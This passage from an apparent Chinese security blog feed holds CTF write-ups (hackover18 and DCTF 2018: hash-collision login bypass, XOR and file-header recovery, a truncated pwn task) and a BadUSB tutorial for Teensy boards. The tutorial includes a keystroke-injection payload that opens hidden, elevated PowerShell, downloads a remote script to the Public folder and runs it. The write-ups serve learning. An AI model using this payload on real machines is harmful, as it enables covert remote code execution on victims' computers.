  <span class="built_in">std</span>::<span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">"./flag.txt"</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> flag;</span><br><span class="line">    ifs &gt;&gt; flag;</span><br><span class="line">    SecureHashtable table;</span><br><span class="line">    table.insert_keyvalue(<span class="string">"root"</span>, flag);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">int</span> choice;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> name, password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Main menu:\n1 - Register new user\n2 - Login\n"</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Name: "</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="string">"root"</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"You are not root!\n"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            table.insert_keyvalue(name, password);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (table.lookup_keyvalue(name, password)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Success! Logged in as %s\n"</span>, name.c_str());</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">"root"</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"You win, the flag is %s\n"</span>, flag.c_str());</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Invalid credentials!\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Invalid choice!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>分析一下流程，首先要用户注册，可是不能注册root用户，但是在登录的时候要以root身份登录才可以获取flag</p><p><code>EVP_MD_CTX_init</code><br>该函数初始化一个EVP_MD_CTX结构</p><p><code>EVP_DigestInit_ex</code><br>该函数使用參数impl所指向的ENGINE设置该信息摘要结构体，參数ctx在调用本函数之前必须经过初始化。參数type通常是使用象EVP_sha1这种函数的返回值。假设impl为NULL。那么就会使用缺省实现的信息摘要函数。大多数应用程序里面impl是设置为NULL的。操作成功返回1，否则返回0。</p><p><code>EVP_DigestUpdate</code><br>该函数将參数d中的cnt字节数据进行信息摘要到ctx结构中去。该函数能够被调用多次。用以对很多其它的数据进行信息摘要。操作成功返回1，否则返回0。</p><p><code>EVP_DigestFinal_ex</code><br>本函数将<code>ctx</code>结构中的摘要信息数据返回到參数md中，假设參数<code>s</code>不是<code>NULL</code>，那么摘要数据的长度（字节）就会被写入到參数s中，大多数情况下，写入的值是<code>EVP_MAX_MD_SIZE</code>。在调用本函数后。不能使用同样的<code>ctx</code>结构调用<code>EVP_DigestUpdate</code>再进行数据的信息摘要操作,可是假设调用<code>EVP_DigestInit_ex</code>函数又一次初始化后能够进行新的信息摘要操作。操作成功返回1，否则返回0。</p><p>特别注意，名称和密码一个接一个地添加到摘要中，并且使用<code>std :: string :: size</code>确定添加的字节数，它返回字符串的实际字节数，不包括null 字节。使用例如<code>name ==“fo”</code>和<code>password =“obar”</code>可以实现相同的结果，因此这两组凭证将导致相同的摘要，因此<code>std :: unordered_set</code>中的桶相同。现在我们来试试。我们注册名称为<code>==“ro”</code>且密码<code>==“ot1”</code>的用户，然后只需尝试登录名称<code>==“root”</code>和密码<code>==“1”</code></p><p><img src="https://i.loli.net/2018/10/13/5bc209f185fb4.png" alt=""></p><p>flag:<code>hackover18{00ps_y0u_mu5t_h4ve_h1t_a_v3ry_unlikely_5peci4l_c4s3}</code></p><h2 id="Hummel-Hummel"><a href="#Hummel-Hummel" class="headerlink" title="Hummel Hummel"></a>Hummel Hummel</h2><blockquote><p>There is no “hackover18{*}” in the word. the solution has to be inserted as hackover18{mysolution}.</p></blockquote><p>下载下来一个mp4的文件，播放看见一个马在打屁，可是很有节奏，用audacity查看，发现</p><p><img src="https://i.loli.net/2018/10/20/5bcae369881ec.png" alt=""></p><p>看起来像是莫斯密码,上下相连的为<code>.</code>,其他为<code>-</code>,全部连起来就是这样</p><p><code>.--. --- . - .-. -.-- / .. -. ... .--. .. .-. . -.. / -... -.-- / -... .- -.- . -.. / -... . .- -. .....</code></p><p>flag:<code>hackover18{poetry inspired by baked beans}</code></p><h2 id="UnbreakMyStart"><a href="#UnbreakMyStart" class="headerlink" title="UnbreakMyStart"></a>UnbreakMyStart</h2><p>题目是<code>xz</code>文件，但是看起来好像损坏了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ xxd unbreak_my_start.tar.xz</span><br><span class="line">0000000: 504b 0304 1400 0800 0800 04e6 d6b4 4602  PK............F.</span><br><span class="line">0000010: 0021 0116 0000 0074 2fe5 a3e0 07ff 007d  .!.....t/......&#125;</span><br><span class="line">0000020: 5d00 331b 0847 5472 2320 a8d7 45d4 9ae8  ].3..GTr# ..E...</span><br><span class="line">0000030: 3a57 139f 493f c634 8905 8c4f 0bc6 3b67  :W..I?.4...O..;g</span><br><span class="line">0000040: 7028 1a35 f195 abb0 2e26 666d 8c92 da43  p(.5.....&amp;fm...C</span><br><span class="line">0000050: 11e1 10ac 4496 e2ed 36cf 9c99 afe6 5a8e  ....D...6.....Z.</span><br><span class="line">0000060: 311e cb99 f4be 6dca 943c 4410 8873 428a  1.....m..&lt;D..sB.</span><br><span class="line">0000070: 7c17 f47a d17d 7808 b7e4 22b8 ec19 9275  |..z.&#125;x...&quot;....u</span><br><span class="line">0000080: 5073 0c34 5f9e 14ac 1986 d378 7b79 9f87  Ps.4_......x&#123;y..</span><br><span class="line">0000090: 0623 7369 4372 19da 6e33 0217 7f8d 0000  .#siCr..n3......</span><br><span class="line">00000a0: 0000 001c 0f1d febd b436 8c00 0199 0180  .........6......</span><br><span class="line">00000b0: 1000 00ad af23 35b1 c467 fb02 0000 0000  .....#5..g......</span><br><span class="line">00000c0: 0459 5a                                                                               .YZ</span><br></pre></td></tr></table></figure><p>这个<code>PK</code>是zip文件常见的,参考这个<code>xz</code>文件格式<a href="https://tukaani.org/xz/xz-file-format-1.0.4.txt" target="_blank" rel="noopener">https://tukaani.org/xz/xz-file-format-1.0.4.txt</a></p><p>我们尝试用我们构造的头替换文件的前11个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=unbreak_my_start.tar.xz of=trimmed.bin bs=1 skip=11</span><br><span class="line">184+0 records in</span><br><span class="line">184+0 records out</span><br><span class="line">184 bytes transferred in 0.000920 secs (199988 bytes/sec)</span><br><span class="line">$ (printf &quot;\xFD7zXZ\x00\x00\x04&quot;; cat trimmed.bin) &gt; fixed.tar.xz</span><br><span class="line">$ xz -d fixed.tar.xz</span><br><span class="line">$ cat fixed.tar </span><br><span class="line">flag.txt000644 001750 001750 00000000045 13340067500 013221 0ustar00heddhaheddha000000 000000 hackover18&#123;U_f0und_th3_B3st_V3rs10n&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p>flag:<code>hackover18{U_f0und_th3_B3st_V3rs10n}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/3169&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;文章首发先知&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;I-AM-MANY&quot;&gt;&lt;a href=&quot;#I-AM-MANY&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BadUSB初探</title>
    <link href="https://threst.github.io/2018/11/02/HID/"/>
    <id>https://threst.github.io/2018/11/02/HID/</id>
    <published>2018-11-02T05:32:13.000Z</published>
    <updated>2018-11-11T10:13:09.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Teensy-USB开发板"><a href="#Teensy-USB开发板" class="headerlink" title="Teensy USB开发板"></a>Teensy USB开发板</h2><p>Teensy是一个非常小的完整的基于USB接口的单片机开发系统，能够实现多种类型的项目。所有的编程是通过USB端口。在没有特殊的程序要求下，只有一个标准的Mini-B USB电缆和PC或Macintosh电脑的USB端口。</p><p>主要特点：</p><pre><code>可以是任何类型设备的USBAVR处理器，16 MHz单个按键编程易于使用的Teensy Loader应用程序免费软件开发工具兼容Mac OS X，Linux和Windows小尺寸,许多项目的完美支持使用标签面包板非常低的成本</code></pre><p>所需工具：</p><pre><code>1.Teensy ++ 2.0 2.Teensyduino插件v1.443.arduino v1.8.7</code></pre><p><a href="https://www.arduino.cc/en/Main/Software/" target="_blank" rel="noopener">arduino下载</a><br><a href="http://www.pjrc.com/teensy/td_download.html" target="_blank" rel="noopener">Teensyduino插件下载地址</a><br><a href="https://www.pjrc.com/teensy/loader.html" target="_blank" rel="noopener">Teensy Loader</a></p><p>1.Arduino软件不支持Teensy，因此您必须运行Teensyduino安装程序 才能将Teensy文件添加到Arduino软件中。</p><p>2.如果您使用的是Linux，则 必须将<a href="https://www.pjrc.com/teensy/49-teensy.rules" target="_blank" rel="noopener">49-teensy.rules</a>文件复制到<code>/etc/udev/rules.d/</code>，以便非root用户访问Teensy USB设备</p><p>3.板子正常编译的时候会弹出teensy的窗口，按下板子上面的按钮，等下teensy就会识别出插入的是什么型号的板子.只有识别出才可以上传代码。</p><p>注意:arduino选teensy++2.0板子，usb type 类型选第二个,要不提示Keyboard变量不存在</p><p><img src="https://i.loli.net/2018/10/27/5bd4309735e79.png" alt=""></p><h2 id="Kautilya安装"><a href="#Kautilya安装" class="headerlink" title="Kautilya安装"></a>Kautilya安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/samratashok/Kautilya &amp;&amp; cd Kautilya</span><br><span class="line">bundle install</span><br><span class="line">ruby kautilya.rb</span><br><span class="line"></span><br><span class="line">Updates:</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><h2 id="keyboard语法"><a href="#keyboard语法" class="headerlink" title="keyboard语法"></a>keyboard语法</h2><p>盘功能使32u4或SAMD微型板能够通过微型原生USB端口向连接的计算机发送击键。注意：并非所有可能的ASCII字符，特别是非打印字符，都可以通过键盘库发送。</p><p><code>Keyboard.print()</code>和<code>Keyboard.println()</code>都是屏幕输出，后者换行输出<br><code>Keyboard.press()</code>功能就像按下键并按住键盘一样<br><code>Keyboard.release()</code>释放键盘,和press向对应<br><code>Keyboard.write()</code>向所连接的计算机发送击键。这类似于按下和释放键盘上的键。您可以发送一些ASCII字符或其他键盘修饰符和特殊键。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">按键  键码  按键  键码  按键  键码  按键  键码</span><br><span class="line">A     65    J   74    S   83    1   49</span><br><span class="line">B     66    K   75    T   84    2   50</span><br><span class="line">C     67    L   76    U   85    3   51</span><br><span class="line">D     68    M   77    V   86    4   52</span><br><span class="line">E     69    N   78    W   87    5   53</span><br><span class="line">F     70    O   79    X   88    6   54</span><br><span class="line">G     71    P   80    Y   89    7   55</span><br><span class="line">H     72    Q   81    Z   90    8   56</span><br><span class="line">I     73    R   82    0   48    9   57</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">按键  键码  按键  键码  按键  键码  按键  键码</span><br><span class="line">0     96    8   104   F1  112   F7  118</span><br><span class="line">1     97    9   105   F2  113   F8  119</span><br><span class="line">2     98    *   106   F3  114   F9  120</span><br><span class="line">3     99    +   107   F4  115   F10 121</span><br><span class="line">4     100 Enter 108   F5  116   F11 122</span><br><span class="line">5     101   -   109   F6  117   F12 123</span><br><span class="line">6     102   .   110              </span><br><span class="line">7     103   /   111</span><br><span class="line"></span><br><span class="line">按键        键码   按键       键码   按键        键码     按键  键码</span><br><span class="line">BackSpace   8     Esc       27    Right Arrow 39      -_  189</span><br><span class="line">Tab         9     Spacebar  32    Down Arrow  40      .&gt;  190</span><br><span class="line">Clear       12    Page Up   33    Insert      45      /?  191</span><br><span class="line">Enter       13    Page Down 34    Delete      46      `~  192</span><br><span class="line">Shift       16    End       35    Num Lock    144     [&#123;  219</span><br><span class="line">Control     17    Home      36    ;:          186     /|  220</span><br><span class="line">Alt         18    Left Arrow 37   =+          187     ]&#125;  221</span><br><span class="line">Cape Lock   20    Up A</span><br></pre></td></tr></table></figure><h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><p>全屏装逼<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Keyboard.println("START-PROCESS -fILEpATH POWERSHELL \" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD $ENV:PUBLIC;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\'HTTP://image.3001.net/images/20160411/14603516445510.jpg\',\'C:\\USERS\\PUBLIC\\GET.PS1\');./GET.PS1;EXIT\" -vERB RUNAS;EXIT");</span><br></pre></td></tr></table></figure></p><p><code>START-PROCESS</code>你可以指定浏览器和带上URL参数</p><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p><a href="https://www.freebuf.com/sectool/150367.html" target="_blank" rel="noopener"> 实战Teensy烧录渗透测试U盘 </a><br><a href="https://www.freebuf.com/articles/system/96737.html" target="_blank" rel="noopener"> Teensy HID 攻击工具 Kautilya 的改进与稳定利用分析 </a><br><a href="https://astr0baby.wordpress.com/2011/01/30/teensy2-0-and-metasploit/" target="_blank" rel="noopener">Teensy ++ 2.0和Metasploit</a><br><a href="https://astr0baby.wordpress.com/2011/07/27/teensy2-metasploit-part-2/" target="_blank" rel="noopener">Teensy ++ 2.0 Metasploit第2部分</a><br><a href="https://astr0baby.wordpress.com/2011/07/28/teensy2-0-part-3/" target="_blank" rel="noopener">Teensy ++ 2.0 Metasploit第3部分</a><br><a href="http://www.cnblogs.com/hojun/p/6492064.html" target="_blank" rel="noopener">BadUSB —— Teensy++2.0</a><br><a href="https://www.freebuf.com/column/181090.html" target="_blank" rel="noopener">关于HID攻击介绍</a><br><a href="https://hatboy.github.io/2018/09/14/Teensy%E4%B9%8B%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">Teensy之简单代码编写</a><br><a href="https://www.freebuf.com/sectool/107242.html" target="_blank" rel="noopener">利用Arduino快速制作Teensy BadUSB</a><br><a href="http://wiki.radiowar.org/%E4%BD%BF%E7%94%A8TeensyLoader" target="_blank" rel="noopener">使用TeensyLoader</a></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/samratashok/Kautilya" target="_blank" rel="noopener">Kautilya</a><br><a href="https://github.com/Screetsec/Brutal" target="_blank" rel="noopener">Brutal</a><br><a href="https://github.com/lr3800/teensy" target="_blank" rel="noopener">teensy</a><br><a href="https://github.com/Ozuru/Paensy/tree/master/Payloads" target="_blank" rel="noopener">https://github.com/Ozuru/Paensy/tree/master/Payloads</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Teensy-USB开发板&quot;&gt;&lt;a href=&quot;#Teensy-USB开发板&quot; class=&quot;headerlink&quot; title=&quot;Teensy USB开发板&quot;&gt;&lt;/a&gt;Teensy USB开发板&lt;/h2&gt;&lt;p&gt;Teensy是一个非常小的完整的基于USB接口的单片
      
    
    </summary>
    
    
      <category term="BadUSB" scheme="https://threst.github.io/tags/BadUSB/"/>
    
  </entry>
  
  <entry>
    <title>D-CTFQuals2018</title>
    <link href="https://threst.github.io/2018/11/02/D-CTFQuals2018/"/>
    <id>https://threst.github.io/2018/11/02/D-CTFQuals2018/</id>
    <published>2018-11-02T05:32:13.000Z</published>
    <updated>2018-11-11T10:13:44.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XORnigma"><a href="#XORnigma" class="headerlink" title="XORnigma"></a>XORnigma</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_two_str</span><span class="params">(s, key)</span>:</span></span><br><span class="line">    key = key * (len(s) / len(key) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x,y) <span class="keyword">in</span> itertools.izip(s, key)) </span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span> </span><br><span class="line">flag_key = <span class="string">""</span></span><br><span class="line">x = xor_two_str(flag, flag_key)</span><br><span class="line"><span class="keyword">print</span> x.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="comment"># 000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e</span></span><br></pre></td></tr></table></figure><p>查下关于itertools库</p><p><code>izip</code><br><code>izip</code>用于将多个可迭代对象对应位置的元素作为一个元组，将所有元组『组成』一个迭代器，并返回。它的使用形式如下：</p><p><code>izip(iter1, iter2, ..., iterN)</code></p><p>如果某个可迭代对象不再生成值，则迭代停止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from itertools import izip</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; for item in izip(&apos;ABCD&apos;, &apos;xy&apos;):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(&apos;A&apos;, &apos;x&apos;)</span><br><span class="line">(&apos;B&apos;, &apos;y&apos;)</span><br><span class="line">&gt;&gt;&gt; for item in izip([1, 2, 3], [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;]):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(1, &apos;a&apos;)</span><br><span class="line">(2, &apos;b&apos;)</span><br><span class="line">(3, &apos;c&apos;)</span><br></pre></td></tr></table></figure><p>根据这个比赛的规则flag前面都有<code>DCTF</code>这个关键字，再结合前面输出<code>00000000</code>，可以判断这个<code>flag_key</code>就是<code>DCTF</code>，因为一样的异或下就为<code>0</code>了，那么接下来的问题就是猜出其他数字了，根据<code>key * (len(s) / len(key) + 1)</code>可以知道他会一直循环<code>key</code>来加密字符串,<code>00000000</code>之后是<code>3f</code>,我们先将<code>3f</code>转为数字</p><p><code>int(&#39;3f&#39;,16)</code></p><p>输出63,在与<code>D</code>进行异或运算</p><p><code>63 ^ ord(&#39;D&#39;)</code><br>输出123</p><p>那么这个123就是密文的ascii码了,</p><p><code>chr(123)</code></p><p>输出<code>{</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e'</span></span><br><span class="line">key = <span class="string">'DCTF'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc.decode(<span class="string">'hex'</span>))):</span><br><span class="line">    flag += chr(ord(enc.decode(<span class="string">'hex'</span>)[i])^ord(key[i%len(key)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>DCTF{fcc34eaae8bd3614dd30324e932770c3ed139cc2c3250c5b277cb14ea33f77a0}</p><h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>下载来2个文件<code>ransomware.pyc</code>和 <code>youfool!.exe</code>，还原<code>pyc</code>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(buf, password)</span>:</span></span><br><span class="line">    password = password * (len(buf) / len(password) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>).join((chr(ord(x) ^ ord(y)) <span class="keyword">for</span> x, y <span class="keyword">in</span> itertools.izip(buf, password)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./FlagDCTF.pdf'</span>, <span class="string">'r'</span>)</span><br><span class="line">buf = f.read()</span><br><span class="line">f.close()</span><br><span class="line">allchar = string.ascii_letters + string.punctuation + string.digits</span><br><span class="line">password = (<span class="string">''</span>).join((choice(allchar) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">60</span>)))</span><br><span class="line">buf = caesar_cipher(buf, password)</span><br><span class="line">f = open(<span class="string">'./youfool!.exe'</span>, <span class="string">'w'</span>)</span><br><span class="line">buf = f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>大概意思就是将<code>FlagDCTF.pdf</code>文件与随机60个字符异或加密，输出到<code>youfool!.exe</code>文件中去,那么我们只要找到密码就行了,使用这个<a href="https://wiremask.eu/tools/xor-cracker/" target="_blank" rel="noopener">工具</a>猜出大概密码</p><p><code>:P-@uL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4n[hGd/EeX+¼7,2O&quot;+:[w</code></p><p>pdf文件头<code>%PDF-1.</code>,文件尾<code>\n%%EOF\n</code></p><p>在使用这个<a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">工具</a>,选取他的<code>From hex</code>和<code>XOR</code>模块,</p><p>使用<code>xxd  -ps  youfool\!.exe</code> 将文件十六进制输出</p><p><img src="https://i.loli.net/2018/10/01/5bb210c53d2de.png" alt=""></p><p>由于刚才猜出的密码并不是每个字符都是正确的，所以根据output的关键字修改密码，最后得出密码为<code>:P-@uSL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4nP[hGd/EeX+E7,2O&quot;+:[2</code>,得到原始文件，上面就是flag</p><p><code>DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333}</code></p><h2 id="How-lucky-are-you-pwn"><a href="#How-lucky-are-you-pwn" class="headerlink" title="How lucky are you?(pwn)"></a>How lucky are you?(pwn)</h2><blockquote><p>Target: 167.99.143.206 65031<br>Bin: <a href="https://dctf.def.camp/dctf-18-quals-81249812/lucky" target="_blank" rel="noopener">https://dctf.def.camp/dctf-18-quals-81249812/lucky</a></p></blockquote><p><img src="https://i.loli.net/2018/10/04/5bb5d16ca9498.png" alt="1.png"></p><p>大致功能你输入名字，然后要你猜１００个随机数字，重点是输入名字这里，可以控制从而溢出.</p><p>ida反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v4; <span class="comment">// rsi@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax@4</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@6</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax@7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v11; <span class="comment">// 